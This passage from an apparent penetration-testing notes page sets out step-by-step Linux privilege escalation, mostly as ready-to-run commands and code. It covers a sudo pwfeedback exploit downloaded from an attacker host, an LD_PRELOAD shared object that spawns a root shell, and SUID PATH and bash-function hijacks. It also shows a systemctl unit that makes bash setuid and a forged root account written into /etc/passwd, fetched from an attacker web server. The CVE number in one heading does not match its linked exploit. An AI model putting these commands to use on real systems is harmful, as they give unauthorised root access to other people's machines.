</code></pre></div> <h4 id=cve-2019-16634><strong>CVE-2019-16634</strong><a class=headerlink href=#cve-2019-16634 title="Permanent link">&para;</a></h4> <p>sudo -V // Get sudo version</p> <p>sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled</p> <p>Expliot PoC: <a href=https://github.com/saleemrashid/sudo-cve-2019-18634>https://github.com/saleemrashid/sudo-cve-2019-18634</a></p> <p>Download expliot.c Upload to Victim </p> <p>Attacker <div class=highlight><pre><span></span><code><a id=__codelineno-38-1 name=__codelineno-38-1 href=#__codelineno-38-1></a><span class=n>python</span> <span class=n>-m</span> <span class=n>SimpleHTTPServer</span> <span class=n>9000</span> <span class=p>//</span> <span class=n>You</span> <span class=n>can</span> <span class=n>use</span> <span class=n>any</span> <span class=n>port</span>
</code></pre></div></p> <p>Victim</p> <div class=highlight><pre><span></span><code><a id=__codelineno-39-1 name=__codelineno-39-1 href=#__codelineno-39-1></a><span class=nb>wget </span><span class=n>http</span><span class=p>://&lt;</span><span class=n>attacker_ip</span><span class=p>&gt;:</span><span class=n>9000</span><span class=p>/</span><span class=n>expliot</span><span class=p>.</span><span class=n>c</span>
<a id=__codelineno-39-2 name=__codelineno-39-2 href=#__codelineno-39-2></a><span class=n>Compile</span> <span class=n>expliot</span><span class=p>.</span><span class=n>c</span><span class=p>:</span> <span class=n>gcc</span> <span class=n>expliot</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=n>expliot</span>
<a id=__codelineno-39-3 name=__codelineno-39-3 href=#__codelineno-39-3></a><span class=p>./</span><span class=n>expliot</span>
<a id=__codelineno-39-4 name=__codelineno-39-4 href=#__codelineno-39-4></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span> 
</code></pre></div> <h3 id=sudo-ld_preload><strong>Sudo LD_PRELOAD</strong><a class=headerlink href=#sudo-ld_preload title="Permanent link">&para;</a></h3> <p>sudo -l </p> <p>Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?</p> <p>Expliot</p> <div class=highlight><pre><span></span><code><a id=__codelineno-40-1 name=__codelineno-40-1 href=#__codelineno-40-1></a><span class=nb>cd </span><span class=p>/</span><span class=n>tmp</span>
<a id=__codelineno-40-2 name=__codelineno-40-2 href=#__codelineno-40-2></a><span class=n>vi</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span>
<a id=__codelineno-40-3 name=__codelineno-40-3 href=#__codelineno-40-3></a>
<a id=__codelineno-40-4 name=__codelineno-40-4 href=#__codelineno-40-4></a><span class=c>#include &lt;stdio.h&gt;</span>
<a id=__codelineno-40-5 name=__codelineno-40-5 href=#__codelineno-40-5></a><span class=c>#include &lt;sys/types.h&gt;</span>
<a id=__codelineno-40-6 name=__codelineno-40-6 href=#__codelineno-40-6></a><span class=c>#include &lt;stdlib.h&gt;</span>
<a id=__codelineno-40-7 name=__codelineno-40-7 href=#__codelineno-40-7></a>
<a id=__codelineno-40-8 name=__codelineno-40-8 href=#__codelineno-40-8></a><span class=n>void</span> <span class=n>_init</span><span class=p>()</span> <span class=p>{</span>
<a id=__codelineno-40-9 name=__codelineno-40-9 href=#__codelineno-40-9></a>    <span class=n>unsetenv</span><span class=p>(</span><span class=s2>&quot;LD_PRELOAD&quot;</span><span class=p>);</span>
<a id=__codelineno-40-10 name=__codelineno-40-10 href=#__codelineno-40-10></a>    <span class=n>setgid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-40-11 name=__codelineno-40-11 href=#__codelineno-40-11></a>    <span class=n>setuid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-40-12 name=__codelineno-40-12 href=#__codelineno-40-12></a>    <span class=n>system</span><span class=p>(</span><span class=s2>&quot;/bin/bash&quot;</span><span class=p>);</span>
<a id=__codelineno-40-13 name=__codelineno-40-13 href=#__codelineno-40-13></a><span class=p>}</span>
<a id=__codelineno-40-14 name=__codelineno-40-14 href=#__codelineno-40-14></a>
<a id=__codelineno-40-15 name=__codelineno-40-15 href=#__codelineno-40-15></a><span class=n>Compile</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span><span class=p>:</span> <span class=n>gcc</span> <span class=n>-fPIC</span> <span class=n>-shared</span> <span class=n>-o</span> <span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=n>priv</span><span class=p>.</span><span class=n>c</span> <span class=n>-nostartfiles</span>
<a id=__codelineno-40-16 name=__codelineno-40-16 href=#__codelineno-40-16></a><span class=n>Command</span><span class=p>:</span> <span class=n>sudo</span> <span class=n>LD_PRELOAD</span><span class=p>=/</span><span class=n>tmp</span><span class=p>/</span><span class=n>priv</span><span class=p>.</span><span class=n>so</span> <span class=n>awk</span> <span class=p>//</span> <span class=n>awk</span> <span class=n>can</span> <span class=n>be</span> <span class=n>replaced</span> <span class=n>with</span> <span class=n>any</span> <span class=n>sudo</span> <span class=n>binary</span>
</code></pre></div> <h2 id=suid-guid-binaries-overview><strong>SUID / GUID Binaries Overview</strong><a class=headerlink href=#suid-guid-binaries-overview title="Permanent link">&para;</a></h2> <p>SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. </p> <p>Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration</p> <p>GUID permission is similar to the SUID permission, only difference is – when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member</p> <p>Enumeration:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-41-1 name=__codelineno-41-1 href=#__codelineno-41-1></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-u</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-41-2 name=__codelineno-41-2 href=#__codelineno-41-2></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-g</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-41-3 name=__codelineno-41-3 href=#__codelineno-41-3></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=p>-</span><span class=n>4000</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>-exec</span> <span class=nb>ls </span><span class=n>-la</span> <span class=p>{}</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>\;</span>
<a id=__codelineno-41-4 name=__codelineno-41-4 href=#__codelineno-41-4></a><span class=n>find</span> <span class=p>/</span> <span class=n>-uid</span> <span class=n>0</span> <span class=n>-perm</span> <span class=p>-</span><span class=n>4000</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> 
<a id=__codelineno-41-5 name=__codelineno-41-5 href=#__codelineno-41-5></a>
<a id=__codelineno-41-6 name=__codelineno-41-6 href=#__codelineno-41-6></a><span class=p>//</span> <span class=n>Look</span> <span class=k>for</span> <span class=n>any</span> <span class=n>binaries</span> <span class=n>that</span> <span class=n>seem</span> <span class=n>odd</span><span class=p>.</span> <span class=n>Any</span> <span class=n>binaries</span> <span class=n>running</span> <span class=n>from</span> <span class=n>a</span> <span class=n>users</span> <span class=n>home</span> <span class=n>directory</span><span class=p>?</span>
<a id=__codelineno-41-7 name=__codelineno-41-7 href=#__codelineno-41-7></a><span class=p>//</span> <span class=n>Check</span> <span class=n>the</span> <span class=n>version</span> <span class=n>of</span> <span class=n>any</span> <span class=n>odd</span> <span class=n>binaries</span> <span class=n>and</span> <span class=n>see</span> <span class=k>if</span> <span class=n>there</span> <span class=n>are</span> <span class=n>any</span> <span class=n>public</span> <span class=n>expliots</span> <span class=n>that</span> <span class=n>can</span> <span class=n>be</span> <span class=n>used</span> <span class=n>to</span> <span class=n>gain</span> <span class=n>root</span>
</code></pre></div> <h2 id=suid-path-environmental-variable><strong>SUID PATH Environmental Variable</strong><a class=headerlink href=#suid-path-environmental-variable title="Permanent link">&para;</a></h2> <p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.</p> <p>View PATH</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-42-1 name=__codelineno-42-1 href=#__codelineno-42-1></a><span class=nb>echo </span><span class=nv>$PATH</span>
<a id=__codelineno-42-2 name=__codelineno-42-2 href=#__codelineno-42-2></a><span class=n>env</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>PATH</span>
<a id=__codelineno-42-3 name=__codelineno-42-3 href=#__codelineno-42-3></a><span class=n>print</span> <span class=nv>$PATH</span>
</code></pre></div> Example 1</p> <p>Create a Simple Basic SUID binary</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-43-1 name=__codelineno-43-1 href=#__codelineno-43-1></a><span class=nb>cd </span><span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>max</span><span class=p>/</span>
<a id=__codelineno-43-2 name=__codelineno-43-2 href=#__codelineno-43-2></a><span class=n>vi</span> <span class=n>test</span><span class=p>.</span><span class=n>c</span>
<a id=__codelineno-43-3 name=__codelineno-43-3 href=#__codelineno-43-3></a>
<a id=__codelineno-43-4 name=__codelineno-43-4 href=#__codelineno-43-4></a><span class=c>#include&lt;unistd.h&gt;</span>
<a id=__codelineno-43-5 name=__codelineno-43-5 href=#__codelineno-43-5></a><span class=n>void</span> <span class=n>main</span><span class=p>()</span>
<a id=__codelineno-43-6 name=__codelineno-43-6 href=#__codelineno-43-6></a><span class=p>{</span> <span class=n>setuid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-43-7 name=__codelineno-43-7 href=#__codelineno-43-7></a>  <span class=n>setgid</span><span class=p>(</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-43-8 name=__codelineno-43-8 href=#__codelineno-43-8></a>  <span class=n>system</span><span class=p>(</span><span class=s2>&quot;curl -I 127.0.0.1&quot;</span><span class=p>);</span>
<a id=__codelineno-43-9 name=__codelineno-43-9 href=#__codelineno-43-9></a>
<a id=__codelineno-43-10 name=__codelineno-43-10 href=#__codelineno-43-10></a>  <span class=p>}</span>
</code></pre></div> Compile Binary &amp; Add SUID Bit</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-44-1 name=__codelineno-44-1 href=#__codelineno-44-1></a><span class=n>gcc</span> <span class=n>test</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=n>network-tester</span>
<a id=__codelineno-44-2 name=__codelineno-44-2 href=#__codelineno-44-2></a><span class=n>chmod</span> <span class=n>u</span><span class=p>+</span><span class=n>s</span> <span class=n>network-tester</span>
<a id=__codelineno-44-3 name=__codelineno-44-3 href=#__codelineno-44-3></a><span class=nb>mv </span><span class=n>network-tester</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span>
</code></pre></div> Example 1 (Without full bin path)</p> <p>Privilege Escalation</p> <div class=highlight><pre><span></span><code><a id=__codelineno-45-1 name=__codelineno-45-1 href=#__codelineno-45-1></a><span class=n>Find</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-45-2 name=__codelineno-45-2 href=#__codelineno-45-2></a>
<a id=__codelineno-45-3 name=__codelineno-45-3 href=#__codelineno-45-3></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-u</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-45-4 name=__codelineno-45-4 href=#__codelineno-45-4></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>network-tester</span>
<a id=__codelineno-45-5 name=__codelineno-45-5 href=#__codelineno-45-5></a><span class=nb>ls </span><span class=n>-la</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>network-tester</span>
<a id=__codelineno-45-6 name=__codelineno-45-6 href=#__codelineno-45-6></a>
<a id=__codelineno-45-7 name=__codelineno-45-7 href=#__codelineno-45-7></a><span class=n>Test</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span> 
<a id=__codelineno-45-8 name=__codelineno-45-8 href=#__codelineno-45-8></a>
<a id=__codelineno-45-9 name=__codelineno-45-9 href=#__codelineno-45-9></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>network-tester</span>
<a id=__codelineno-45-10 name=__codelineno-45-10 href=#__codelineno-45-10></a><span class=n>strings</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>network-tester</span>
<a id=__codelineno-45-11 name=__codelineno-45-11 href=#__codelineno-45-11></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=nb>curl </span><span class=n>-I</span> <span class=n>127</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>1</span> 
<a id=__codelineno-45-12 name=__codelineno-45-12 href=#__codelineno-45-12></a>
<a id=__codelineno-45-13 name=__codelineno-45-13 href=#__codelineno-45-13></a><span class=n>Absue</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-45-14 name=__codelineno-45-14 href=#__codelineno-45-14></a>
<a id=__codelineno-45-15 name=__codelineno-45-15 href=#__codelineno-45-15></a><span class=nb>echo </span><span class=s2>&quot;/bin/bash&quot;</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>curl</span>
<a id=__codelineno-45-16 name=__codelineno-45-16 href=#__codelineno-45-16></a><span class=n>chmod</span> <span class=n>777</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=nb>curl</span>
<a id=__codelineno-45-17 name=__codelineno-45-17 href=#__codelineno-45-17></a><span class=nb>echo </span><span class=nv>$PATH</span>
<a id=__codelineno-45-18 name=__codelineno-45-18 href=#__codelineno-45-18></a><span class=n>export</span> <span class=n>PATH</span><span class=p>=/</span><span class=n>tmp</span><span class=p>:</span><span class=nv>$PATH</span>
<a id=__codelineno-45-19 name=__codelineno-45-19 href=#__codelineno-45-19></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>network-tester</span>
<a id=__codelineno-45-20 name=__codelineno-45-20 href=#__codelineno-45-20></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Example 3 (Without full bin path)</p> <p>Privilege Escalation</p> <div class=highlight><pre><span></span><code><a id=__codelineno-46-1 name=__codelineno-46-1 href=#__codelineno-46-1></a><span class=n>Find</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-46-2 name=__codelineno-46-2 href=#__codelineno-46-2></a>
<a id=__codelineno-46-3 name=__codelineno-46-3 href=#__codelineno-46-3></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-u</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-46-4 name=__codelineno-46-4 href=#__codelineno-46-4></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-46-5 name=__codelineno-46-5 href=#__codelineno-46-5></a><span class=nb>ls </span><span class=n>-la</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-46-6 name=__codelineno-46-6 href=#__codelineno-46-6></a>
<a id=__codelineno-46-7 name=__codelineno-46-7 href=#__codelineno-46-7></a><span class=n>Test</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span> 
<a id=__codelineno-46-8 name=__codelineno-46-8 href=#__codelineno-46-8></a>
<a id=__codelineno-46-9 name=__codelineno-46-9 href=#__codelineno-46-9></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-46-10 name=__codelineno-46-10 href=#__codelineno-46-10></a><span class=n>strings</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-46-11 name=__codelineno-46-11 href=#__codelineno-46-11></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=n>service</span> <span class=n>apache2</span> <span class=n>status</span>
<a id=__codelineno-46-12 name=__codelineno-46-12 href=#__codelineno-46-12></a>
<a id=__codelineno-46-13 name=__codelineno-46-13 href=#__codelineno-46-13></a><span class=n>Absue</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-46-14 name=__codelineno-46-14 href=#__codelineno-46-14></a>
<a id=__codelineno-46-15 name=__codelineno-46-15 href=#__codelineno-46-15></a><span class=nb>echo </span><span class=s1>&#39;int mian() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0;}&#39;</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>service</span><span class=p>.</span><span class=n>c</span>
<a id=__codelineno-46-16 name=__codelineno-46-16 href=#__codelineno-46-16></a><span class=n>gcc</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>service</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>service</span>
<a id=__codelineno-46-17 name=__codelineno-46-17 href=#__codelineno-46-17></a><span class=n>chmod</span> <span class=n>777</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>service</span>
<a id=__codelineno-46-18 name=__codelineno-46-18 href=#__codelineno-46-18></a><span class=n>export</span> <span class=n>PATH</span><span class=p>=/</span><span class=n>tmp</span><span class=p>:</span><span class=nv>$PATH</span>
<a id=__codelineno-46-19 name=__codelineno-46-19 href=#__codelineno-46-19></a><span class=nb>echo </span><span class=nv>$PATH</span>
<a id=__codelineno-46-20 name=__codelineno-46-20 href=#__codelineno-46-20></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-46-21 name=__codelineno-46-21 href=#__codelineno-46-21></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Example 4 (With full bin path)</p> <p>Privilege Escalation</p> <div class=highlight><pre><span></span><code><a id=__codelineno-47-1 name=__codelineno-47-1 href=#__codelineno-47-1></a><span class=n>Find</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-47-2 name=__codelineno-47-2 href=#__codelineno-47-2></a>
<a id=__codelineno-47-3 name=__codelineno-47-3 href=#__codelineno-47-3></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-u</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-47-4 name=__codelineno-47-4 href=#__codelineno-47-4></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-47-5 name=__codelineno-47-5 href=#__codelineno-47-5></a><span class=nb>ls </span><span class=n>-la</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-47-6 name=__codelineno-47-6 href=#__codelineno-47-6></a>
<a id=__codelineno-47-7 name=__codelineno-47-7 href=#__codelineno-47-7></a><span class=n>Test</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span> 
<a id=__codelineno-47-8 name=__codelineno-47-8 href=#__codelineno-47-8></a>
<a id=__codelineno-47-9 name=__codelineno-47-9 href=#__codelineno-47-9></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-47-10 name=__codelineno-47-10 href=#__codelineno-47-10></a><span class=n>strings</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-47-11 name=__codelineno-47-11 href=#__codelineno-47-11></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>sbin</span><span class=p>/</span><span class=n>service</span> <span class=n>apache2</span> <span class=n>status</span>
<a id=__codelineno-47-12 name=__codelineno-47-12 href=#__codelineno-47-12></a>
<a id=__codelineno-47-13 name=__codelineno-47-13 href=#__codelineno-47-13></a><span class=n>Absue</span> <span class=n>the</span> <span class=n>SUID</span> <span class=n>Binary</span>
<a id=__codelineno-47-14 name=__codelineno-47-14 href=#__codelineno-47-14></a>
<a id=__codelineno-47-15 name=__codelineno-47-15 href=#__codelineno-47-15></a><span class=n>fucntion</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>sbin</span><span class=p>/</span><span class=n>service</span><span class=p>()</span> <span class=p>{</span> <span class=nb>cp </span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=p>/</span><span class=n>tmp</span> <span class=p>&amp;&amp;</span> <span class=n>chmod</span> <span class=p>+</span><span class=n>s</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>bash</span> <span class=p>&amp;&amp;</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span><span class=p>;</span> <span class=p>}</span>
<a id=__codelineno-47-16 name=__codelineno-47-16 href=#__codelineno-47-16></a><span class=n>export</span> <span class=o>-f</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>sbin</span><span class=p>/</span><span class=n>service</span>
<a id=__codelineno-47-17 name=__codelineno-47-17 href=#__codelineno-47-17></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tools</span><span class=p>/</span><span class=n>webserver-status</span>
<a id=__codelineno-47-18 name=__codelineno-47-18 href=#__codelineno-47-18></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Example 5 (/bin/systemctl)</p> <p>Privilege Escalation</p> <p>Copy line by line inside the victim low priv shell <div class=highlight><pre><span></span><code><a id=__codelineno-48-1 name=__codelineno-48-1 href=#__codelineno-48-1></a><span class=n>TF</span><span class=p>=$(</span><span class=n>mktemp</span><span class=p>).</span><span class=n>service</span>
<a id=__codelineno-48-2 name=__codelineno-48-2 href=#__codelineno-48-2></a><span class=nb>echo </span><span class=s1>&#39;[Service]</span>
<a id=__codelineno-48-3 name=__codelineno-48-3 href=#__codelineno-48-3></a><span class=s1>Type=oneshot</span>
<a id=__codelineno-48-4 name=__codelineno-48-4 href=#__codelineno-48-4></a><span class=s1>ExecStart=/bin/sh -c &quot;chmod +s /bin/bash &gt; /tmp/output&quot;</span>
<a id=__codelineno-48-5 name=__codelineno-48-5 href=#__codelineno-48-5></a><span class=s1>[Install]</span>
<a id=__codelineno-48-6 name=__codelineno-48-6 href=#__codelineno-48-6></a><span class=s1>WantedBy=multi-user.target&#39;</span> <span class=p>&gt;</span> <span class=nv>$TF</span>
<a id=__codelineno-48-7 name=__codelineno-48-7 href=#__codelineno-48-7></a><span class=n>systemctl</span> <span class=n>link</span> <span class=nv>$TF</span>
<a id=__codelineno-48-8 name=__codelineno-48-8 href=#__codelineno-48-8></a><span class=n>systemctl</span> <span class=n>enable</span> <span class=p>-</span><span class=n>-now</span> <span class=nv>$TF</span>
<a id=__codelineno-48-9 name=__codelineno-48-9 href=#__codelineno-48-9></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-48-10 name=__codelineno-48-10 href=#__codelineno-48-10></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div></p> <p>Example 5 (Copy - /bin/cp)</p> <p>Privilege Escalation</p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-49-1 name=__codelineno-49-1 href=#__codelineno-49-1></a><span class=n>find</span> <span class=p>/</span> <span class=n>-perm</span> <span class=n>-u</span><span class=p>=</span><span class=n>s</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>xargs</span> <span class=nb>ls </span><span class=n>-l</span>
<a id=__codelineno-49-2 name=__codelineno-49-2 href=#__codelineno-49-2></a><span class=nb>Copy </span><span class=n>the</span> <span class=n>contents</span> <span class=n>of</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span> <span class=n>to</span> <span class=n>your</span> <span class=n>local</span> <span class=n>machine</span> <span class=n>inside</span> <span class=n>a</span> <span class=n>new</span> <span class=n>file</span> <span class=n>called</span> <span class=s2>&quot;passwd&quot;</span>
</code></pre></div> Attacker <div class=highlight><pre><span></span><code><a id=__codelineno-50-1 name=__codelineno-50-1 href=#__codelineno-50-1></a><span class=n>Run</span> <span class=n>the</span> <span class=n>following</span> <span class=n>command</span> <span class=n>locally</span><span class=p>:</span> <span class=n>openssl</span> <span class=n>passwd</span> <span class=p>-</span><span class=n>1</span> <span class=n>-salt</span> <span class=n>ignite</span> <span class=n>NewRootPassword</span>
<a id=__codelineno-50-2 name=__codelineno-50-2 href=#__codelineno-50-2></a><span class=nb>Copy </span><span class=n>the</span> <span class=n>output</span>
<a id=__codelineno-50-3 name=__codelineno-50-3 href=#__codelineno-50-3></a><span class=n>Add</span> <span class=n>the</span> <span class=n>following</span> <span class=n>inside</span> <span class=n>the</span> <span class=n>local</span> <span class=n>passwd</span> <span class=n>file</span>
<a id=__codelineno-50-4 name=__codelineno-50-4 href=#__codelineno-50-4></a><span class=nb>echo </span><span class=s2>&quot;root2:&lt;output&gt;:0:0:root:/root:/bin/bash&quot;</span> <span class=p>&gt;&gt;</span> <span class=n>passwd</span> <span class=p>//</span> <span class=n>Replace</span> <span class=p>&lt;</span><span class=n>output</span><span class=p>&gt;</span> <span class=n>with</span> <span class=n>the</span> <span class=n>copied</span> <span class=n>output</span>
<a id=__codelineno-50-5 name=__codelineno-50-5 href=#__codelineno-50-5></a><span class=n>python</span> <span class=n>-m</span> <span class=n>SimpleHTTPServer</span> <span class=n>9000</span>
</code></pre></div> Victim <div class=highlight><pre><span></span><code><a id=__codelineno-51-1 name=__codelineno-51-1 href=#__codelineno-51-1></a><span class=nb>wget </span><span class=n>-O</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>passwd</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>:</span><span class=n>9000</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-51-2 name=__codelineno-51-2 href=#__codelineno-51-2></a><span class=nb>cp </span><span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>passwd</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-51-3 name=__codelineno-51-3 href=#__codelineno-51-3></a><span class=n>su</span> <span class=n>root2</span>
<a id=__codelineno-51-4 name=__codelineno-51-4 href=#__codelineno-51-4></a><span class=n>Password</span><span class=p>:</span> <span class=n>NewRootPassword</span>
<a id=__codelineno-51-5 name=__codelineno-51-5 href=#__codelineno-51-5></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-51-6 name=__codelineno-51-6 href=#__codelineno-51-6></a>
<a id=__codelineno-51-7 name=__codelineno-51-7 href=#__codelineno-51-7></a><span class=p>//</span> <span class=n>Replace</span> <span class=n>Attacker</span> <span class=n>IP</span> <span class=p>&amp;</span> <span class=n>Port</span>
